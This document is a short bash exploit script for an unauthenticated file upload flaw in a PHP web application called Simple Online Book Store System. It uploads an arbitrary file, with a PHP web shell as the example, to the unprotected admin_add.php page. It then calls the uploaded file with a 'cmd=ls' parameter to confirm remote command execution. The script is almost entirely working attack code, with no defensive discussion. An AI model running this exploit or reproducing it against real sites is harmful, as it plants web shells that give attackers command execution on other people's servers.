#!/bin/bash
# Simple Online Book Store System Unauthenticated file upload vulnerability
#
# ./osb_1.0_unauth_file_upload.sh base_url filename
# example:
# ./osb_1.0_unauth_file_upload.sh http://192.168.56.101/obs shell.php
#  File Uploaded to : http://192.168.56.101/obs/bootstrap/img/shell.php
######################

base=$1
file=$2
req=$(curl -F add=pwn -F image=@$file $base/admin_add.php -s)
req=$(curl "$base/bootstrap/img/$file?cmd=ls" -v 2>&1 | grep -ow "200")

if [[ $req == "200" ]]
then
	echo File Uploaded to : $base/bootstrap/img/$file
else
	echo Failed :/
fi
